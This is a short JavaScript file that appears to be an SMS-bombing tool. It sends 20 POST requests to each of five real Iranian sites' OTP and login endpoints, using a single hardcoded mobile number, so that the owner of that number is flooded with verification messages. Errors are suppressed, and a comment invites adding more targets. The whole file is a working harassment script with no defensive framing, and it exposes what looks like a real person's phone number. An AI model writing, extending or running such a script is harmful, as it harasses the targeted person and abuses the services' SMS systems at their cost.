const axios = require("axios");

function sendRequests() {
  const mobileNo = "09356202886";

  const requests = [
    {
      url: "https://gharar.ir/users/phone_number/",
      payload: {
        phone: mobileNo,
      },
    },
    {
      url: "https://api.digikala.com/v1/user/authenticate/",
      payload: {
        backUrl: "/",
        username: mobileNo,
        otp_call: false,
      },
    },
    {
      url: "https://auth.basalam.com/otp-request",
      payload: {
        mobile: mobileNo,
        client_id: 23,
      },
    },

    {
      url: "https://gw.taaghche.com/v4/site/auth/signup",
      payload: {
        contact: mobileNo,
      },
    },
    {
      url: "https://gw.taaghche.com/v4/site/auth/login",
      payload: {
        contact: mobileNo,
        forceOtp: false,
      },
    },

    // Add more objects here as needed
  ];

  const loopCount = 20; // Number of requests per object

  for (let i = 0; i < requests.length; i++) {
    const { url, payload } = requests[i];

    for (let j = 0; j < loopCount; j++) {
      const requestConfig = {
        url,
        method: "post",
        data: payload,
      };

      axios(requestConfig)
        .then((response) => {
          console.log(
            `Request ${i + 1}-${j + 1} successful. Response:`,
            response.data
          );
        })
        .catch((error) => {});
    }
  }
}

sendRequests();
